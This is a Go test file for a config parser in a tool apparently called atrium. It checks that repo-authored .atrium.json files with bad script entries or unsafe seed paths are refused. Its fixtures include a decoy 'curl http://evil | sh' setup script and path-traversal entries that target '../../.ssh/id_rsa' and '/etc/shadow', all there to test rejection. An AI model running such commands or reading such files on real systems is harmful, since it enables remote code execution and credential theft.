package repocfg

import (
	"fmt"
	"reflect"
	"sort"
	"strings"
	"testing"

	"github.com/stretchr/testify/assert"
	"github.com/stretchr/testify/require"

	"github.com/ZviBaratz/atrium/config"
)

func TestParseRepoLocal(t *testing.T) {
	t.Run("a plain entry parses", func(t *testing.T) {
		got, err := ParseRepoLocal([]byte(`{
			"repo_scripts": [
				{"name": "web", "setup_script": "npm ci", "run_command": "npm run dev", "port_range": "3000-3099"}
			]
		}`))
		require.NoError(t, err)
		require.Len(t, got.Entries, 1)
		assert.Empty(t, got.Problems)
		assert.Equal(t, "web", got.Entries[0].Name)
		assert.Equal(t, "npm ci", got.Entries[0].SetupScript)
	})

	t.Run("unknown top-level keys are tolerated", func(t *testing.T) {
		// A key a newer atrium reads must be committable to a repo before every user
		// has upgraded; an older atrium ignores it rather than refusing the file.
		// carry_files and link_paths shipped under this tolerance and are now read
		// (#815), so the fixture names a key nothing reads.
		got, err := ParseRepoLocal([]byte(`{
			"session_defaults": {"model": "opus"},
			"repo_scripts": [{"setup_script": "make deps"}]
		}`))
		require.NoError(t, err)
		assert.Len(t, got.Entries, 1)
		assert.Empty(t, got.Problems)
	})

	t.Run("undecodable bytes are an error naming the file", func(t *testing.T) {
		_, err := ParseRepoLocal([]byte(`{not json`))
		require.Error(t, err)
		assert.Contains(t, err.Error(), RepoLocalFileName)
	})

	t.Run("no repo_scripts section parses to nothing", func(t *testing.T) {
		got, err := ParseRepoLocal([]byte(`{}`))
		require.NoError(t, err)
		assert.Empty(t, got.Entries)
		assert.Empty(t, got.Problems)
	})

	t.Run("more than one entry refuses the whole file", func(t *testing.T) {
		// The decoy this closes: matchers are refused here, so selection always
		// picks the first entry — a second one could only run if the first failed
		// LATE validation, i.e. after the trust prompt described the first. A file
		// where the prompt's entry and the running entry can differ is refused
		// outright, exactly like undecodable JSON: no prompt, nothing runs.
		_, err := ParseRepoLocal([]byte(`{
			"repo_scripts": [
				{"name": "deps", "setup_script": "npm ci", "port_range": "nope"},
				{"setup_script": "curl http://evil | sh"}
			]
		}`))
		require.Error(t, err)
		assert.Contains(t, err.Error(), RepoLocalFileName)
		assert.Contains(t, err.Error(), "2 repo_scripts entries")
		assert.Contains(t, err.Error(), "exactly one")
	})

	t.Run("matcher fields are refused", func(t *testing.T) {
		got, err := ParseRepoLocal([]byte(`{
			"repo_scripts": [
				{"name": "routed", "remote_matches": ["github.com/acme"], "setup_script": "make"}
			]
		}`))
		require.NoError(t, err)
		assert.Empty(t, got.Entries)
		require.Len(t, got.Problems, 1)
		assert.Contains(t, got.Problems[0].Msg, "repo-local")
		// The problem is findable: it carries the entry's position in this file.
		assert.Equal(t, 0, got.Problems[0].Index)
	})

	t.Run("an entry that configures nothing is refused at parse time", func(t *testing.T) {
		// Refused HERE, in compile's own words, so WantsPrompt (which counts
		// Entries) can never raise a trust prompt for a file whose only entry
		// would then be refused by ValidateOne right after the grant.
		got, err := ParseRepoLocal([]byte(`{
			"repo_scripts": [{"name": "placeholder"}]
		}`))
		require.NoError(t, err)
		assert.Empty(t, got.Entries, "a nothing-declaring entry must not count as usable")
		require.Len(t, got.Problems, 1)
		assert.Contains(t, got.Problems[0].Msg, "configures nothing")

		// The wording pact with compile: one spelling for one defect, wherever found.
		_, problem := ValidateOne(0, config.RepoScript{Name: "placeholder"})
		require.NotNil(t, problem)
		assert.Equal(t, got.Problems[0].Msg, problem.Msg)
	})

	// The property the trust boundary leans on: parsing happens BEFORE the trust
	// verdict, so it must not compile (i.e. execute-validate) repo-authored template
	// strings. A template that cannot compile still parses here; only ValidateOne —
	// which the gate calls after the grant check — refuses it.
	t.Run("templates are not compiled at parse time", func(t *testing.T) {
		got, err := ParseRepoLocal([]byte(`{
			"repo_scripts": [{"setup_script": "{{.NoSuchField}}"}]
		}`))
		require.NoError(t, err)
		require.Len(t, got.Entries, 1)
		assert.Empty(t, got.Problems)

		// Positive control for the split: the same entry IS refused by the
		// post-trust validator. Without this half, the parse-time assertion would
		// also pass if template checking had been dropped everywhere.
		_, problem := ValidateOne(got.Entries[0].Index, got.Entries[0].RepoScript)
		require.NotNil(t, problem)
		assert.True(t, strings.Contains(problem.Msg, "template"), "ValidateOne should refuse on the template, got: %s", problem.Msg)
	})
}

// TestParseRepoLocal_SeedLists covers #815's two keys: what a repo may declare,
// and every shape that refuses the file whole rather than seeding a set the trust
// prompt never described.
func TestParseRepoLocal_SeedLists(t *testing.T) {
	t.Run("both lists parse and canonicalize", func(t *testing.T) {
		got, err := ParseRepoLocal([]byte(`{
			"carry_files": [".dev.vars", "./config/local.yml"],
			"link_paths": ["node_modules/", "container/agent-runner/node_modules"]
		}`))
		require.NoError(t, err)
		assert.Empty(t, got.Entries, "a seed-only file declares no repo_scripts entry")
		assert.Empty(t, got.Problems)
		// Canonical, not verbatim: the pathspec git is asked about and the path the
		// filesystem join derives from must be the same spelling.
		assert.Equal(t, []string{".dev.vars", "config/local.yml"}, got.CarryFiles)
		assert.Equal(t, []string{"node_modules", "container/agent-runner/node_modules"}, got.LinkPaths)
	})

	t.Run("a seed-only file declares something", func(t *testing.T) {
		// The property the gate leans on: a file with no repo_scripts still has
		// content to trust, so it must not read as "declares nothing" (which is
		// silent, ungrantable, and would make the whole feature dead).
		got, err := ParseRepoLocal([]byte(`{"link_paths": ["node_modules"]}`))
		require.NoError(t, err)
		require.NotEmpty(t, RepoLocalSurfaces(got))
		assert.Equal(t, []string{"1 linked path"}, RepoLocalSurfaces(got))
	})

	t.Run("an unusable entry refuses the whole file, naming it", func(t *testing.T) {
		for _, tc := range []struct{ name, body, want string }{
			{"parent escape", `{"carry_files": ["../../.ssh/id_rsa"]}`, `carry_files[0] ("../../.ssh/id_rsa")`},
			{"absolute", `{"link_paths": ["/etc"]}`, `link_paths[0] ("/etc")`},
			{"empty", `{"carry_files": [".env", ""]}`, `carry_files[1]`},
			{"repo root", `{"link_paths": ["."]}`, `link_paths[0] (".")`},
		} {
			t.Run(tc.name, func(t *testing.T) {
				_, err := ParseRepoLocal([]byte(tc.body))
				require.Error(t, err)
				assert.Contains(t, err.Error(), tc.want, "the refusal must name the entry the user has to fix")
				assert.Contains(t, err.Error(), RepoLocalFileName)
			})
		}
	})

	t.Run("a valid entry does not survive an unusable seed list", func(t *testing.T) {
		// The leak this closes: a Problem beside a surviving entry would let the
		// script run while the lists it shipped with went missing, so the refusal is
		// whole-file. Nothing from this file applies.
		got, err := ParseRepoLocal([]byte(`{
			"repo_scripts": [{"setup_script": "npm ci"}],
			"carry_files": ["/etc/shadow"]
		}`))
		require.Error(t, err)
		assert.Empty(t, got.Entries)
		assert.Empty(t, got.CarryFiles)
	})

	t.Run("a list past the entry cap refuses the whole file", func(t *testing.T) {
		// The cap bounds git forks per materialization, not bytes: this fixture is
		// well under MaxRepoLocalBytes.
		entries := make([]string, MaxRepoLocalSeedEntries+1)
		for i := range entries {
			entries[i] = fmt.Sprintf("%q", fmt.Sprintf("dep%d", i))
		}
		raw := fmt.Sprintf(`{"link_paths": [%s]}`, strings.Join(entries, ","))
		require.Less(t, len(raw), MaxRepoLocalBytes, "the fixture must prove the byte cap is not what refuses it")

		_, err := ParseRepoLocal([]byte(raw))
		require.Error(t, err)
		assert.Contains(t, err.Error(), "at most")

		// The boundary itself is allowed.
		ok, err := ParseRepoLocal([]byte(fmt.Sprintf(`{"link_paths": [%s]}`, strings.Join(entries[:MaxRepoLocalSeedEntries], ","))))
		require.NoError(t, err)
		assert.Len(t, ok.LinkPaths, MaxRepoLocalSeedEntries)
	})
}

// TestCanonicalSeedPath pins the one lexical rule both the repo-local parser and
// session/git's resolveSeedPaths call, since a divergence between them would grant
// an entry that never seeds or seed one that was never granted.
func TestCanonicalSeedPath(t *testing.T) {
	for _, tc := range []struct{ in, want string }{
		{"node_modules", "node_modules"},
		{"node_modules/", "node_modules"},
		{"./node_modules", "node_modules"},
		{"node_modules/.", "node_modules"},
		{"a/b/../c", "a/c"},
	} {
		got, err := CanonicalSeedPath(tc.in)
		require.NoErrorf(t, err, "entry %q must resolve", tc.in)
		assert.Equalf(t, tc.want, got, "entry %q", tc.in)
	}
	for _, bad := range []string{"", ".", "..", "/etc", "../escape", "node_modules/../../escape"} {
		_, err := CanonicalSeedPath(bad)
		assert.Errorf(t, err, "entry %q must be refused", bad)
	}
}

// TestRepoLocalLayerKeysMatchTheWireSchema is the bridge guard: the settings panel
// marks exactly these row keys as repo-layered, so a key added to the file's schema
// without being added here would layer over a global row that still claims to be the
// only source. repo_scripts is excluded because a repo-local entry REPLACES the
// user's matching entry rather than layering over it — and it has no panel row.
func TestRepoLocalLayerKeysMatchTheWireSchema(t *testing.T) {
	tp := reflect.TypeOf(repoLocalWire{})
	var tagged []string
	for i := 0; i < tp.NumField(); i++ {
		name := strings.Split(tp.Field(i).Tag.Get("json"), ",")[0]
		if name == "" || name == "-" || name == "repo_scripts" {
			continue
		}
		tagged = append(tagged, name)
	}
	sort.Strings(tagged)
	got := RepoLocalLayerKeys()
	sort.Strings(got)
	assert.Equal(t, tagged, got, "every layerable key in .atrium.json's schema must be declared for the settings panel")
}

// TestProblemNamesItsSection keeps the two spellings apart: the global config's
// Problems must read exactly as they always did, and a seed-list refusal must name
// its own key rather than borrowing repo_scripts'.
func TestProblemNamesItsSection(t *testing.T) {
	assert.Equal(t, `repo_scripts[2]: bad`, Problem{Index: 2, Msg: "bad"}.Error())
	assert.Equal(t, `repo_scripts[0] ("web"): bad`, Problem{Index: 0, Name: "web", Msg: "bad"}.Error())
	assert.Equal(t, `carry_files[1] (".env"): bad`, Problem{Section: "carry_files", Index: 1, Name: ".env", Msg: "bad"}.Error())
}
